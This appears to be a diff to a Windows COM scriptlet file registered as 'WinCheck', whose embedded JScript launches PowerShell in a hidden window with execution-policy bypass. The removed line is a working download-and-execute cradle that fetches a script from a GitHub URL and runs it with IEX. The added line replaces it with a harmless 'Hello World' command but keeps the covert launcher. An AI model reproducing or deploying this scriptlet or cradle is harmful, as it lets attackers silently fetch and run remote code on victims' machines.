@@ -4,7 +4,7 @@
     progid="WinCheck"
     classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
     <script language="JScript">
-		<![CDATA[cmd = new ActiveXObject("WScript.Shell").Run("powershell.exe -W hidden -ep Bypass -nologo -nop;[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; IEX ((New-Object System.Net.WebClient).DownloadString('https://github.com/verax999/hey/edit/main/hello.ps1'))");]]>
+		<![CDATA[cmd = new ActiveXObject("WScript.Shell").Run("powershell.exe -W hidden -ep Bypass -nologo -nop -c Write-Host 'Hello World'");]]>
 	</script>
     </registration>
 </scriptlet>
